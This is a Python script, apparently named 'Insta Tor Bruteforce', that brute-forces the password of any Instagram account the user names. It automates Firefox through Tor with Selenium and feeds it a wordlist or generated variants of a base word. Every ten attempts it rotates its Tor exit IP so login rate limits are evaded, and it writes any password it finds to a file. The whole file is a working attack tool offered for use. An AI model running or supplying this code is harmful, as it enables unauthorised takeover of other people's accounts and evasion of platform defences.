#!/usr/bin/env python3

import os, time, random, subprocess
from rich.console import Console
from rich.prompt import Prompt
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By

console = Console()

# شعار
console.print("\n[bold red]██╗     ██╗   ██╗███████╗██╗   ██╗███╗   ██╗██╗██╗  ██╗[/]")
console.print("[bold red]██║     ██║   ██║██╔════╝██║   ██║████╗  ██║██║╚██╗██╔╝[/]")
console.print("[bold red]██║     ██║   ██║███████╗██║   ██║██╔██╗ ██║██║ ╚███╔╝ [/]")
console.print("[bold red]██║     ██║   ██║╚════██║██║   ██║██║╚██╗██║██║ ██╔██╗ [/]")
console.print("[bold red]███████╗╚██████╔╝███████║╚██████╔╝██║ ╚████║██║██╔╝ ██╗[/]")
console.print("[bold white]  Insta Tor Bruteforce - Simple Edition by lveunix\n[/]")

# تثبيت التور
console.print("[bold cyan]🔧 Checking Tor...[/]")
os.system("sudo service tor start")
time.sleep(3)

# إعداد متصفح Tor عبر selenium
options = Options()
options.headless = False
options.set_preference('network.proxy.type', 1)
options.set_preference('network.proxy.socks', '127.0.0.1')
options.set_preference('network.proxy.socks_port', 9050)
options.set_preference("network.proxy.socks_remote_dns", True)

# معلومات المستخدم
username = Prompt.ask("[bold green]👤 Enter Instagram username")
mode = Prompt.ask("[bold cyan]📂 Mode: 1-Wordlist | 2-Smart Gen", choices=["1", "2"])

passwords = []
attempts = 0
ip_switch_rate = 10

if mode == "1":
    wordlist = Prompt.ask("[bold cyan]🔢 Enter path to wordlist")
    if not os.path.exists(wordlist):
        console.print("[bold red]❌ File not found!")
        exit()
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]
else:
    base = Prompt.ask("[bold cyan]🧠 Enter base word to generate passwords from")
    symbols = ['!', '@', '#', '', '_']
    numbers = ['123', '2024', '007', '', '11']
    def smart_gen(word):
        while True:
            yield word + random.choice(numbers) + random.choice(symbols)
    password_gen = smart_gen(base)

# تغيير IP عبر Tor
def change_ip():
    os.system("echo -e 'AUTHENTICATE \"\"\r\nsignal NEWNYM\r\nQUIT' | nc 127.0.0.1 9051 > /dev/null")

# تشغيل Firefox
console.print("[bold blue]🌐 Launching Firefox through Tor...[/]")
driver = webdriver.Firefox(options=options)
driver.get("https://www.instagram.com/accounts/login/")
time.sleep(6)

# تجربة تسجيل الدخول
def try_login(pwd):
    global attempts
    try:
        console.print(f"[bold cyan]🔁 Trying: [white]{pwd}")
        driver.get("https://www.instagram.com/accounts/login/")
        time.sleep(3)
        driver.find_element(By.NAME, "username").send_keys(username)
        driver.find_element(By.NAME, "password").send_keys(pwd)
        driver.find_element(By.XPATH, "//button[@type='submit']").click()
        time.sleep(6)

        url = driver.current_url
        if "challenge" in url or "two_factor" in url:
            console.print(f"\n[bold green]✅ SUCCESS! Password is: [white]{pwd}")
            with open("found.txt", "w") as f:
                f.write(f"{username}:{pwd}\n")
            driver.save_screenshot("success.png")
            driver.quit()
            exit()
        elif "checkpoint" in url:
            console.print(f"\n[bold yellow]⚠️ Checkpoint triggered for: [white]{pwd}")
            driver.quit()
            exit()
        else:
            console.print("[bold red]❌ Incorrect")
    except Exception as e:
        console.print(f"[bold red]⚠️ Error: {e}")
        time.sleep(4)

    attempts += 1
    if attempts % ip_switch_rate == 0:
        console.print("[bold blue]🔁 Switching Tor IP...")
        change_ip()
        time.sleep(5)

# تنفيذ التخمين
if mode == "1":
    for pwd in passwords:
        try_login(pwd)
else:
    for _ in range(999999):
        try_login(next(password_gen))